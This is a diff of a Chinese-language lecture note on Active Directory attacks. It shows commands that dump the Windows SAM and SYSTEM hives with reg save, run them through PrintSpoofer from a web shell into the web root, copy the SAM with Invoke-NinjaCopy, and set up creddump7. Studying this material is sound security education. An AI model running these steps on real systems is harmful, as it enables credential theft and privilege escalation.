@@ -30,33 +30,34 @@ Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGp
 
     主要目的就是把SAM file和SYSTEM file dump下來，而方法就是利用reg.exe(Windows註冊碼工具)，用指令的方式存取
     ```bash
-    $ reg save HKLM\SAM <save filename>
-    $ reg save HKLM\SYSTEM <save filename>
+    $ reg save HKLM\\SAM <save filename>
+    $ reg save HKLM\\SYSTEM <save filename>
     ```
     * 錯誤的方式
+        
         但經過cmd用普通權限實測會發現我們沒有這樣的資格
         ```bash
-        $ reg save HKLM\SAM SAM.dump
+        $ reg save HKLM\\SAM SAM.dump
         錯誤: 用戶端沒有這項特殊權限。
         ```
         其實也很合理，不然所有人都可以直接存取意味著只要摸到其中一臺普通權限的AD，所有機敏資料都會外洩，這就是為甚麼前面需要提權的原因，只有最高權限的帳戶可以存取這兩個file
     * 正確的方式-1
         用前面提到的web shell，打出以下指令，則SAM file就會dump到`C:\inetpub\wwwroot\sam.zip`
         ```bash
-        $ c:\tools\PrintSpoofer64.exe -c "reg save HKLM\SAM C:\inetpub\wwwroot\sam"
+        $ c:\\tools\\PrintSpoofer64.exe -c "reg save HKLM\SAM C:\inetpub\wwwroot\sam"
         ```
     * 正確的方式-2
         利用[Invoke-NinjaCopy.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1)這個腳本，就可以複製出來，原理是使用windows的影子複製
         ```bash
-        $ .\Invoke-NinjaCopy -Path SAM -LocalDestination C:\tools\SAM_COPY
+        $ .\\Invoke-NinjaCopy -Path SAM -LocalDestination C:\\tools\\SAM_COPY
         ```
         但是經過實測，發現執行雖然有成功但是沒有任何檔案被dump出來，可能中間有些過程有誤?
         
         如果要用這個方法，PowerShell要以管理員權限打開，然後如果有遇到如下error message，可以參考這邊[^ps-error-solution]解決問題
         ```bash
-        .\Invoke-NinjaCopy : 因為這個系統上已停用指令碼執行，所以無法載入 C:\tools\Invoke-NinjaCopy.ps1 檔案。如需詳細資訊，請參閱 about_Execution_Policies，網址為 https:/go.microsoft.com/fwlink/?LinkID=135170。
+        .\\Invoke-NinjaCopy : 因為這個系統上已停用指令碼執行，所以無法載入 C:\\tools\\Invoke-NinjaCopy.ps1 檔案。如需詳細資訊，請參閱 about_Execution_Policies，網址為 https:/go.microsoft.com/fwlink/?LinkID=135170。
         位於 線路:1 字元:1
-        + .\Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestina ...
+        + .\\Invoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SAM -LocalDestina ...
         + ~~~~~~~~~~~~~~~~~~
             + CategoryInfo          : SecurityError: (:) [], PSSecurityException
             + FullyQualifiedErrorId : UnauthorizedAccess
@@ -77,7 +78,7 @@ Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGp
         可以看到很多都是disabled，就代表我們要用下面的解法
     * Win10 v1607之後
     
-        因為這個版本之後有用到AES加密，所以可以用[Creddump7](https://github.com/CiscoCXSecurity/creddump7)，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事，
+        因為這個版本之後有用到AES加密，所以可以用[Creddump7](https://github.com/CiscoCXSecurity/creddump7)，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事
         ```bash
         $ conda activate py2.7
         $ pip install pycrypto
